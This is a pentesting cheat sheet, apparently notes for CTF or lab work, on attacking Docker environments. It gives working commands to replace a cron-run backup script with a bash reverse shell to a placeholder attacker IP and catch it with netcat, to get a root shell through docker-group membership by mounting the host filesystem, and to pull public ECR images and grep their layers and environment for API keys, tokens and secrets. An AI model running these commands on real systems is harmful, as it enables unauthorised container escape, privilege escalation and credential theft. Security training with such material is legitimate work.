---
title: Docker Pentesting
desc: 
tags: [AWS, Container, Docker, Netcat, PrivEsc, Privilege]
alts: [Privilege-Escalation-Linux]
render_with_liquid: false
---

## 1. Basic Investigation

1. List All Images

    ```sh
    docker images
    ```

<br />

## 2. Escape from Container to Desired Machine

1. **Check if the Backup File like "backup.sh" Exists**

    ```sh
    cd /opt/backups
    ls
    ```

2. **Add Reverse Shell Payload to the Backup File**

    If you find the backup file and it's executed automatically at regular intervals by cron, inject the reverse shell payload to escape from the container shell.

    ```sh
    echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh
    # or
    printf '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh
    ```

3. **Open Listner for Waiting the Reverse Shell**

    Use "nc" command to open listener and wait for while running the previous script by cron.

    ```sh
    # In attacker machine, wait for the cron job execute the reverse shell
    nc -lvnp 4444
    ```

4. **Confirmation**

    If you found the computer's name changed, you gained the access to the desired machine successfully.

    ```sh
    user@realhost:~#
    ```

<br />

## 3. Root Privilege Escalation (Docker Group Required)

1. **Check if Current User Belongs to "docker" Group**

    ```sh
    groups
    ```

2. **Gain the Root Shell**

    ```sh
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```

<br />

## 4. Amazon Elastic Container Registry (ECR) Public Gallery

1. **Run the Docker Container**

    - **Retrieve a Container Image**

        ```sh
        docker pull public.ecr.aws/<registry-alias>/<repository>:latest
        ```

    - **Check if It was Pulled**

        ```sh
        docker images
        ```

    - **Run the Container and Interect with It**

        ```sh
        docker run -it public.ecr.aws/<registry-alias>/<repository>:latest
        ```

2. **Get Sensitive Information in the Container**

    You may be able to get the interesting data like **api_key**.

    ```sh
    printenv
    ```

3. **Get Sensitive Information in Local Machine**

    - **Check the Container Config and Retrieve Sensitive Information**

        Process the following flows in your local machine.

        ```sh
        mkdir example
        cd example/
        docker save -o example.tar public.ecr.aws/<registry-alias>/<repository>:latest
        tar -xf example.tar

        # Config files
        cat manifest.json | jq
        cat f9ab.......json | jq

        # Also config file in each directory
        cd 2246f........../
        tar -xvf layer.tar

        # Get sensitive information
        grep -e 'token' -e 'secret' */*
        ```